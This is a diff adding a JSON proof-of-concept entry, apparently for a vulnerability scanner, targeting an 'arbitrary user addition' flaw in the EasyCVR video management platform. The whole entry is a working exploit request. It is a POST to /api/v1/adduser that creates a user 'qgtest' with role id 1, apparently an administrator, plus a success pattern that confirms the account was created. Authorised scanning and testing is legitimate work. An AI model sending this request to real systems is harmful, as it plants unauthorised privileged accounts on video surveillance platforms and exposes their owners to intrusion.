@@ -1,0 +1,14 @@
+{
+	"name":"EasyCVR视频管理平台任意用户添加",
+	"tag":"tsingsee",
+	"type":"other",
+	"poc":{
+		"pocGet":"/api/v1/adduser",
+		"pocPost":"name=qgtest&username=qgtest&password=0e7517141fb53f21ee439b355b5a1d0a&roleid=1",
+		"header":{
+			"Content-Type":" application/x-www-form-urlencoded; charset=UTF-8"
+		},
+		"status_code":"200",
+		"pattern":"(success)"
+	}
+}
